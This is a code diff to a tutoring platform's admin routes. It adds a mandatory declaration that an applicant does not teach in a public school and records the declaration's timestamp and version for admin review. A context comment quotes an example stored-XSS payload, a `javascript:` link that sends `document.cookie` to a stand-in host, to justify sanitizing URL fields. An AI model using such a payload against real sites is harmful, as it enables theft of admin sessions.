@@ -14,6 +14,7 @@ import {
   vUuid, vText, vOptionalText, vOptionalUrl, safeFileName, isUuid,
   adminNotifyEmails, sniffMime,
   type PendingTutor, type TutorVerification,
+  PUBLIC_TEACHER_DECLARATION_VERSION,
 } from "@tnajem/shared";
 import { mailEnabled, sendMail } from "@tnajem/shared/mail";
 import { db } from "../db";
@@ -133,6 +134,12 @@ export async function adminRoutes(app: FastifyInstance): Promise<void> {
       return { ok: false, error: "too-many-documents" };
     }
 
+    /* DÉCRET 2015-1619. Nobody who teaches in a public school may be featured, so
+       the declaration is a condition of submitting, checked before anything is
+       written, and stored (with its wording version) on the application the
+       admin reviews. LEGAL-REVIEW in @tnajem/shared/legal. */
+    if (fields.get("notPublicTeacher") !== "yes") return { ok: false, error: "declaration-required" };
+
     /* Text + link fields. The seven *Url fields land in the tutors row and are
        rendered as <a href> on the ADMIN review page — a tutor submitting
        `javascript:fetch('//evil.tn?c='+document.cookie)` as their "website" would
@@ -219,6 +226,8 @@ export async function adminRoutes(app: FastifyInstance): Promise<void> {
           .set({
             status: "pending",
             submittedAt: new Date(),
+            publicTeacherDeclaredAt: new Date(),
+            publicTeacherDeclarationVersion: PUBLIC_TEACHER_DECLARATION_VERSION,
             reviewNote: null,
             experienceYears: years,
             institution: institution.value,
@@ -345,6 +354,9 @@ export async function adminRoutes(app: FastifyInstance): Promise<void> {
         introVideo: t.introVideoUrl ?? null,
       },
       submittedAt: t.submittedAt ? t.submittedAt.toISOString() : null,
+      publicTeacherDeclaration: t.publicTeacherDeclaredAt
+        ? { declaredAt: t.publicTeacherDeclaredAt.toISOString(), version: t.publicTeacherDeclarationVersion ?? "" }
+        : null,
       docs: (docsByTutor.get(t.id) ?? []).map((d) => ({
         id: d.id,
         kind: d.kind,
